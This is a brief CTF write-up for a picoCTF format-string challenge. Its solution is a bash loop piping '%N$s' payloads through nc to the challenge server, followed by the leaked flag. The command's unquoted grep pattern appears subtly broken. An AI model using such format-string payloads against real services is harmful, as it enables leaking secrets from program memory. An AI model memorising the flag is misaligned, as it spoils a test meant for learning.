## Objetivo


Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using: `nc saturn.picoctf.net 62996`
## Datos de Acceso al Nivel

`nc saturn.picoctf.net 62996`
## Solucion

```
┌──(kali㉿kali)-[~]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 62996 | grep -Ei (pico|ctf); done 
CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}

```

## Notas Adicionales



## Referencias

